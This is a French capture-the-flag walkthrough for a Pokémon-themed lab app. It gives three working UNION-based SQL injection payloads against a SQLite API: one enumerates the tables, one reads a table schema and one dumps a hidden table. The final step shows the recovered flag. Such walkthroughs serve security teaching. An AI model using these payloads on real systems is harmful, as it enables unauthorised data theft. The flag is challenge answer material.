# Team Requête - Partie 2

## Fichiers fournis

- Lien vers l'instance

## Démarrage

Pour lancer l'application, utilisez Docker avec les commandes suivantes :

```
docker build -t teamrequetep2 .
docker run -p 8000:8000 --rm --name teamrequetep2 teamrequetep2
```

## Description

Dans cette partie du défi, le Pokémon secret est caché dans une table nommée `pokemon_secret`. La vulnérabilité d'injection SQL (SQLi) présente dans la requête `/api/pokemons` a été corrigée. Cependant, une nouvelle vulnérabilité a été introduite dans la requête `/api/pokemon`, qui permet d'obtenir les détails d'un Pokémon spécifique.

Pour faciliter l'exploitation, l'affichage des erreurs est activé. De plus, les tentatives d'injection via les mots clés `OR` ont été bloquées pour contrer les injections SQLMap classiques.

L'approche recommandée est d'utiliser une injection SQL de type `UNION based SQLi` afin de récupérer des informations depuis d'autres tables.

> Requête 1 UNION requête 2

En se basant sur le format JSON retourné par l'API, il n'est pas nécessaire de neutraliser la première requête pour que les résultats s'affichent correctement. Toutefois, si l'on utilise l'interface graphique, il est impératif de neutraliser la première requête, car un seul Pokémon peut être affiché à la fois.

Étapes à suivre :

1.  Récupérer le nom des tables.
2.  Récupérer le nom et le nombre de colonnes de la table `pokemon_secret`.
3.  Récupérer les informations contenues dans la table `pokemon_secret`.

## Étapes d'exploitation

1.  **Récupérer le nom des tables :**

    La requête suivante permet de lister les tables, en excluant les tables systèmes de SQLite :

```
arbok' AND name != 'arbok' UNION SELECT  NULL,group_concat(tbl_name),NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --
```

    Résultat : `pokemon, pokemon_secret`

2.  **Récupérer le nom des colonnes de la table `pokemon_secret` :**

    Utilisez la requête suivante pour obtenir le schéma de la table `pokemon_secret` :

```
arbok' AND name != 'arbok' UNION SELECT  NULL,sql,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='pokemon_secret' --
```

    Résultat : `POKEMON_SECRET(ID, NAME, HEIGHT, WEIGHT, BASE_EXPERIENCE, SPRITE)`

3.  **Récupérer le Pokémon secret :**

    Injectez une requête SQL pour récupérer les données de la table `pokemon_secret` :

```
arbok' AND name != 'arbok' UNION SELECT id,name,height,weight,base_experience,sprite FROM pokemon_secret --
```

    Résultat : `CTFAC{UN10N_B453D_5QL1}`
